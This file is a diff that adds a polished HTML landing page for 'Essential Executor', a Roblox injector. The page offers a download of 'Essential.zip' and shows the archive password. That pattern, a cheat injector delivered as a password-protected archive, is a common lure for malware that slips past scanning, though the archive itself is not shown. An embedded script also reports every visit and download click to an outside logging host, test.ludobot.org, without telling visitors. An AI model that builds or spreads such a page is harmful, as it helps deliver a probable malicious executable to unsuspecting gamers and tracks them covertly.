@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Essential Executor — Roblox injector landing page.">
+<title>Essential Executor — Official</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#030711;--bg2:#07101e;--card:rgba(9,20,38,.72);--card2:#0b192c;
+  --blue:#1687ff;--blue2:#57b0ff;--cyan:#8bd0ff;--text:#f5f9ff;--muted:#8ea1ba;
+  --line:rgba(104,174,255,.15);--line2:rgba(104,174,255,.27);
+}
+html{scroll-behavior:smooth}
+body{font-family:Inter,system-ui,sans-serif;background:var(--bg);color:var(--text);overflow-x:hidden}
+body:before{content:"";position:fixed;inset:0;z-index:-3;background:
+ radial-gradient(circle at 50% -5%,rgba(21,132,255,.24),transparent 28%),
+ radial-gradient(circle at 90% 40%,rgba(17,90,190,.11),transparent 25%),
+ linear-gradient(rgba(255,255,255,.018) 1px,transparent 1px),
+ linear-gradient(90deg,rgba(255,255,255,.018) 1px,transparent 1px);
+ background-size:auto,auto,60px 60px,60px 60px;mask-image:linear-gradient(#000 0%,transparent 85%)}
+body:after{content:"";position:fixed;inset:0;z-index:20;pointer-events:none;opacity:.035;background:repeating-linear-gradient(0deg,#fff 0,#fff 1px,transparent 1px,transparent 4px)}
+a{text-decoration:none;color:inherit}
+.container{width:min(1140px,92%);margin:auto}
+.nav{height:76px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--line);position:relative;z-index:5}
+.brand{display:flex;align-items:center;gap:11px;font-weight:800;font-size:19px;letter-spacing:-.04em}
+.logo{width:35px;height:35px;border-radius:10px;display:grid;place-items:center;background:linear-gradient(135deg,#2294ff,#0754b9);box-shadow:0 0 35px rgba(22,135,255,.32);position:relative;overflow:hidden}
+.logo:before{content:"";position:absolute;width:80px;height:15px;background:rgba(255,255,255,.16);transform:rotate(-35deg);animation:shine 3.5s infinite}
+.logo:after{content:"";width:12px;height:12px;border:2px solid #fff;border-radius:4px;position:relative}
+.links{display:flex;align-items:center;gap:25px;font-size:13px;color:#9eb1c8}
+.links a{transition:.2s;color:#9eb1c8}.links a:hover{color:#fff}
+.nav-btn{padding:9px 14px!important;border:1px solid var(--line2);border-radius:9px;background:rgba(13,37,66,.75);color:#fff!important}
+.hero{padding:92px 0 75px;text-align:center;position:relative}
+.hero-glow{position:absolute;left:50%;top:20px;width:560px;height:320px;transform:translateX(-50%);background:#087dff;filter:blur(130px);opacity:.08;pointer-events:none}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 12px;border:1px solid var(--line);border-radius:999px;background:rgba(9,24,44,.75);color:#a8c8e9;text-transform:uppercase;letter-spacing:.13em;font-size:10px;font-weight:800;animation:fadeUp .7s both}
+.pulse{width:6px;height:6px;border-radius:50%;background:#36a5ff;box-shadow:0 0 0 0 rgba(54,165,255,.6);animation:pulse 1.8s infinite}
+h1{font-size:clamp(52px,8vw,88px);line-height:.93;letter-spacing:-.075em;margin:25px auto 21px;max-width:900px;animation:fadeUp .8s .08s both}
+h1 span{background:linear-gradient(90deg,#fff,#52acff 55%,#1887ff);-webkit-background-clip:text;background-clip:text;color:transparent}
+.lead{max-width:640px;margin:auto;color:var(--muted);font-size:15px;line-height:1.8;animation:fadeUp .8s .16s both}
+.cta{display:flex;justify-content:center;gap:11px;margin-top:30px;animation:fadeUp .8s .24s both}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:9px;border-radius:10px;padding:13px 21px;font-size:13px;font-weight:800;transition:.22s;position:relative;overflow:hidden}
+.btn:hover{transform:translateY(-3px)}
+.primary{background:linear-gradient(135deg,#2295ff,#0964d8);box-shadow:0 12px 34px rgba(18,128,245,.25);color:white}
+.primary:before{content:"";position:absolute;top:0;left:-100%;width:60%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.25),transparent);transform:skewX(-20deg);animation:buttonShine 3.5s infinite}
+.secondary{border:1px solid var(--line);background:rgba(8,19,35,.75);color:#d7e5f6}
+.version{font-size:10px;color:#617792;margin-top:12px;animation:fadeUp .8s .3s both}
+.trust{display:flex;justify-content:center;gap:28px;flex-wrap:wrap;margin-top:28px;color:#5f7590;font-size:10px;text-transform:uppercase;letter-spacing:.12em}
+.trust span{display:flex;align-items:center;gap:6px}.trust b{color:#6fbaff;font-size:13px}
+.showcase{margin:8px auto 105px;padding:9px;border:1px solid var(--line);border-radius:15px;background:linear-gradient(145deg,rgba(15,34,59,.9),rgba(5,12,24,.95));box-shadow:0 40px 100px rgba(0,0,0,.42),0 0 80px rgba(20,130,255,.06);animation:float 7s ease-in-out infinite}
+.window{border-radius:9px;overflow:hidden;background:#060e1b;border:1px solid rgba(255,255,255,.03)}
+.bar{height:39px;border-bottom:1px solid var(--line);display:flex;align-items:center;padding:0 13px;gap:6px;background:#091425}
+.ball{width:7px;height:7px;border-radius:50%;background:#28425f}
+.address{margin-left:10px;color:#637995;font-size:10px}.secure{margin-left:auto;color:#5188ba;font-size:9px}
+.dashboard{display:grid;grid-template-columns:190px 1fr;min-height:300px}
+.sidebar{border-right:1px solid var(--line);padding:18px}
+.side-title{font-size:9px;color:#4f6782;text-transform:uppercase;letter-spacing:.15em;margin:4px 9px 10px}
+.item{padding:9px;border-radius:7px;color:#7188a2;font-size:10px;margin:3px 0;transition:.2s}.item:hover{background:#0a1e37;color:#9acbff}.item.active{background:linear-gradient(90deg,#0d315a,#0a2340);color:#5bb1ff;box-shadow:inset 2px 0 #1687ff}
+.content{padding:25px;text-align:left}.small{font-size:9px;color:#5d7794;text-transform:uppercase;letter-spacing:.14em}
+.content h3{font-size:23px;letter-spacing:-.04em;margin:7px 0 18px}.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+.stat{padding:14px;border:1px solid var(--line);background:linear-gradient(145deg,#0a192c,#081321);border-radius:8px;transition:.25s}.stat:hover{transform:translateY(-3px);border-color:var(--line2)}
+.stat b{font-size:16px}.stat p{font-size:9px;color:#647b95;margin-top:3px}.mini-bar{height:4px;border-radius:99px;background:#12253d;margin-top:13px;overflow:hidden}.mini-bar i{display:block;height:100%;width:78%;background:linear-gradient(90deg,#147df5,#5ab5ff);border-radius:99px;animation:load 2s ease-out}
+section{padding-bottom:100px}.eyebrow{font-size:10px;letter-spacing:.17em;text-transform:uppercase;color:#4ba8ff;font-weight:800}
+h2{font-size:36px;letter-spacing:-.055em;margin-top:7px}.section-desc{font-size:13px;color:var(--muted);margin-top:8px}
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:29px}
+.card{position:relative;overflow:hidden;padding:24px;border:1px solid var(--line);background:linear-gradient(145deg,rgba(11,25,44,.78),rgba(7,15,28,.75));border-radius:12px;transition:.3s}
+.card:before{content:"";position:absolute;width:100px;height:100px;right:-45px;top:-45px;border-radius:50%;background:#1687ff;filter:blur(45px);opacity:0;transition:.3s}
+.card:hover{transform:translateY(-6px);border-color:var(--line2);box-shadow:0 18px 45px rgba(0,0,0,.25)}.card:hover:before{opacity:.13}
+.icon{width:39px;height:39px;display:grid;place-items:center;border-radius:9px;background:#0b2949;color:#54aeff;font-size:10px;font-weight:800;margin-bottom:19px;border:1px solid rgba(80,170,255,.1)}
+.card h3{font-size:15px;margin-bottom:7px}.card p{font-size:12px;color:var(--muted);line-height:1.75}
+.metrics{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-top:30px}.metric{padding:20px;border:1px solid var(--line);border-radius:11px;background:rgba(8,19,34,.65)}.metric strong{font-size:25px;letter-spacing:-.05em}.metric p{color:#687e97;font-size:10px;margin-top:3px}
+.download{position:relative;overflow:hidden;text-align:center;border:1px solid var(--line);border-radius:15px;padding:65px 20px;background:radial-gradient(circle at 50% 0,rgba(22,135,255,.16),transparent 55%),#091425;box-shadow:0 30px 70px rgba(0,0,0,.2)}
+.download:before,.download:after{content:"";position:absolute;border:1px solid rgba(67,160,255,.09);border-radius:50%;left:50%;top:0;transform:translate(-50%,-75%);pointer-events:none}.download:before{width:430px;height:430px}.download:after{width:650px;height:650px}
+.download>*{position:relative;z-index:1}.download p{max-width:560px;margin:11px auto 25px;color:var(--muted);font-size:13px}.fine{font-size:9px;color:#5c728c;margin-top:13px}
+
+.password-box {
+  background: #0a1a2a;
+  border: 2px solid #1e88e5;
+  border-radius: 60px;
+  padding: 12px 28px;
+  display: inline-flex;
+  align-items: center;
+  gap: 18px;
+  margin: 18px auto 22px;
+  box-shadow: 0 0 30px rgba(30,136,229,0.15);
+}
+.password-box span {
+  font-weight: 600;
+  color: #aac3e0;
+  font-size: 15px;
+}
+.password-box .code {
+  background: #0d1f33;
+  padding: 6px 28px;
+  border-radius: 40px;
+  font-family: monospace;
+  font-size: 26px;
+  font-weight: 700;
+  color: #7ec8ff;
+  letter-spacing: 3px;
+  border: 1px solid #2a5a7a;
+}
+.download .btn { font-size: 16px; padding: 16px 32px; }
+
+footer{border-top:1px solid var(--line);padding:24px 0;color:#5f748c;font-size:10px;display:flex;justify-content:space-between}
+
+.reveal {
+  opacity: 0;
+  transform: translateY(30px);
+  transition: opacity 0.7s cubic-bezier(0.22, 0.61, 0.36, 1), transform 0.7s cubic-bezier(0.22, 0.61, 0.36, 1);
+}
+.reveal.show {
+  opacity: 1;
+  transform: translateY(0);
+}
+
+#cursor-glow{position:fixed;width:260px;height:260px;border-radius:50%;background:#1687ff;filter:blur(100px);opacity:.055;pointer-events:none;z-index:-1;transform:translate(-50%,-50%)}
+@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:none}}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(54,165,255,.55)}70%{box-shadow:0 0 0 9px rgba(54,165,255,0)}100%{box-shadow:0 0 0 0 rgba(54,165,255,0)}}
+@keyframes shine{0%,65%{left:-100%}100%{left:170%}}@keyframes buttonShine{0%,55%{left:-100%}75%,100%{left:170%}}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}@keyframes load{from{width:0}to{width:78%}}
+@media(max-width:760px){.links a:not(.nav-btn){display:none}.hero{padding-top:65px}.grid,.metrics{grid-template-columns:1fr}.dashboard{grid-template-columns:1fr}.sidebar{display:none}.stats{grid-template-columns:1fr}.showcase{margin-bottom:75px}h2{font-size:30px}footer{display:block}footer span{display:block;margin-top:6px}.password-box{flex-wrap:wrap;justify-content:center;gap:8px}}
+</style>
+</head>
+<body>
+<div id="cursor-glow"></div>
+
+<nav class="nav container">
+  <a class="brand" href="#"><div class="logo"></div>Essential Executor</a>
+  <div class="links">
+    <a href="#features">Features</a><a href="#overview">Overview</a><a href="#faq">FAQ</a>
+    <a class="nav-btn" href="#download">Download</a>
+  </div>
+</nav>
+
+<main>
+<section class="hero container">
+  <div class="hero-glow"></div>
+  <div class="pill"><span class="pulse"></span> Official Essential Executor</div>
+  <h1>Built for a <span>better</span><br>Roblox experience.</h1>
+  <p class="lead">A powerful, lightweight injector with a modern interface, focused controls, and a clean design built to stay out of your way.</p>
+  <div class="cta">
+    <a class="btn primary" href="#download">Download Essential Executor</a>
+    <a class="btn secondary" href="#features">Explore Features</a>
+  </div>
+  <div class="version">Windows 10/11 &nbsp;•&nbsp; Version 1.0 &nbsp;•&nbsp; Free</div>
+  <div class="trust"><span><b>✓</b> Clean UI</span><span><b>✓</b> Lightweight</span><span><b>✓</b> Regular updates</span></div>
+</section>
+
+<div class="showcase container reveal">
+  <div class="window">
+    <div class="bar"><i class="ball"></i><i class="ball"></i><i class="ball"></i><span class="address">essential / injector</span><span class="secure">● SYSTEM READY</span></div>
+    <div class="dashboard">
+      <aside class="sidebar">
+        <div class="side-title">Workspace</div>
+        <div class="item active">Dashboard</div><div class="item">Injector</div><div class="item">Activity</div><div class="item">Settings</div>
+      </aside>
+      <div class="content">
+        <div class="small">System overview</div><h3>Welcome to Essential Executor.</h3>
+        <div class="stats">
+          <div class="stat"><b>Ready</b><p>System status</p><div class="mini-bar"><i></i></div></div>
+          <div class="stat"><b>1.0</b><p>Current version</p><div class="mini-bar"><i style="width:100%"></i></div></div>
+          <div class="stat"><b>Fast</b><p>Interface response</p><div class="mini-bar"><i style="width:92%"></i></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<section id="features" class="container reveal">
+  <div class="eyebrow">Features</div><h2>Small details. Better experience.</h2>
+  <p class="section-desc">Everything is designed to feel intentional, fast, and professional.</p>
+  <div class="grid">
+    <article class="card"><div class="icon">01</div><h3>Professional Interface</h3><p>A refined dark interface with clear navigation, subtle depth, and a consistent visual hierarchy.</p></article>
+    <article class="card"><div class="icon">02</div><h3>Lightweight Design</h3><p>Minimal visual overhead keeps the experience responsive and focused on what matters.</p></article>
+    <article class="card"><div class="icon">03</div><h3>Modern Visuals</h3><p>Deep navy surfaces, animated highlights, soft glows, and blue accents create a premium look.</p></article>
+    <article class="card"><div class="icon">04</div><h3>Responsive Layout</h3><p>The interface adapts cleanly to desktop screens without losing its visual balance.</p></article>
+    <article class="card"><div class="icon">05</div><h3>Clear Updates</h3><p>A simple release area makes it easy to present the latest version and important changes.</p></article>
+    <article class="card"><div class="icon">06</div><h3>Focused Experience</h3><p>No unnecessary social blocks or distractions — just the product, information, and download.</p></article>
+  </div>
+</section>
+
+<section id="overview" class="container reveal">
+  <div class="eyebrow">Overview</div><h2>Made to stay simple.</h2><p class="section-desc">A few numbers that communicate the product at a glance.</p>
+  <div class="metrics">
+    <div class="metric"><strong>1.0</strong><p>Latest release</p></div>
+    <div class="metric"><strong>24/7</strong><p>Access to the platform</p></div>
+    <div class="metric"><strong>10/11</strong><p>Windows support</p></div>
+    <div class="metric"><strong>100%</strong><p>Focused design</p></div>
+  </div>
+</section>
+
+<section id="faq" class="container reveal">
+  <div class="eyebrow">FAQ</div><h2>Frequently asked questions.</h2>
+  <div class="grid">
+    <article class="card"><h3>What is Essential Executor?</h3><p>Essential Executor is a clean Roblox injector with a modern utility interface.</p></article>
+    <article class="card"><h3>Is it free?</h3><p>The landing page presents the current release as free to download.</p></article>
+    <article class="card"><h3>Which platform is supported?</h3><p>The current page lists Windows 10 and Windows 11 as the supported desktop platforms.</p></article>
+  </div>
+</section>
+
+<section id="download" class="container reveal">
+  <div class="download">
+    <div class="eyebrow">Latest Release</div>
+    <h2>Download Essential Executor.</h2>
+    <p>Get the latest release for Windows and experience the clean, focused Essential interface.</p>
+
+    <div class="password-box">
+      <span>Archive password</span>
+      <span class="code">2026</span>
+    </div>
+
+    <a class="btn primary" href="Essential.zip" download>Download Essential Executor</a>
+    <div class="fine">Version 1.0 &nbsp;•&nbsp; Windows 10/11 &nbsp;•&nbsp; Official release</div>
+  </div>
+</section>
+</main>
+
+<footer class="container"><span>© 2026 Essential. All rights reserved.</span><span>Official product website</span></footer>
+
+<script>
+fetch('https://test.ludobot.org/log/api.php', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: 'action=visit'
+}).catch(err => console.log('Visit error:', err));
+
+document.addEventListener('DOMContentLoaded', function() {
+    const downloadBtn = document.querySelector('a[href="Essential.zip"]');
+    if (downloadBtn) {
+        downloadBtn.addEventListener('click', function(e) {
+            fetch('https://test.ludobot.org/log/api.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'action=download'
+            }).catch(err => console.log('Download error:', err));
+        });
+    }
+});
+</script>
+
+<script>
+const glow = document.getElementById('cursor-glow');
+window.addEventListener('pointermove', e => {
+  glow.style.left = e.clientX + 'px';
+  glow.style.top = e.clientY + 'px';
+});
+
+function isElementVisible(el) {
+  const rect = el.getBoundingClientRect();
+  const windowHeight = window.innerHeight || document.documentElement.clientHeight;
+  const windowWidth = window.innerWidth || document.documentElement.clientWidth;
+  return (
+    rect.top < windowHeight - 50 &&
+    rect.bottom > 50 &&
+    rect.left < windowWidth - 50 &&
+    rect.right > 50
+  );
+}
+
+function showVisibleReveals() {
+  document.querySelectorAll('.reveal:not(.show)').forEach(el => {
+    if (isElementVisible(el)) {
+      el.classList.add('show');
+    }
+  });
+}
+
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('show');
+    }
+  });
+}, { threshold: 0.12, rootMargin: '0px 0px -30px 0px' });
+
+document.querySelectorAll('.reveal').forEach(el => {
+  observer.observe(el);
+});
+
+setTimeout(showVisibleReveals, 50);
+window.addEventListener('scroll', () => {
+  requestAnimationFrame(showVisibleReveals);
+}, { passive: true });
+</script>
+</body>
+</html>
